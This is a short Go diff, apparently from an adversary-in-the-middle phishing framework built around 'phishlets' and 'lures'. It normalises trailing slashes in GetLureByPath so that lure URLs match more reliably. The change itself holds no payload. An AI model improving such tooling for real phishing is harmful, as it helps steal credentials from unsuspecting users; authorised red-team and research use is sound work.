@@ -788,19 +788,22 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 }
 
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
-	// Extract base path without query parameters
+	// Extract base path without query parameters and normalize trailing slash
 	basePath := path
 	if idx := strings.Index(path, "?"); idx != -1 {
 		basePath = path[:idx]
 	}
+	// Remove trailing slash if present
+	basePath = strings.TrimSuffix(basePath, "/")
 
 	for _, l := range c.lures {
 		if l.Phishlet == site {
 			pl, err := c.GetPhishlet(site)
 			if err == nil {
 				if host == l.Hostname || host == pl.GetLandingPhishHost() {
-					// Compare only the base path
-					if l.Path == basePath {
+					// Compare paths without trailing slashes
+					lurePath := strings.TrimSuffix(l.Path, "/")
+					if lurePath == basePath {
 						return l, nil
 					}
 				}
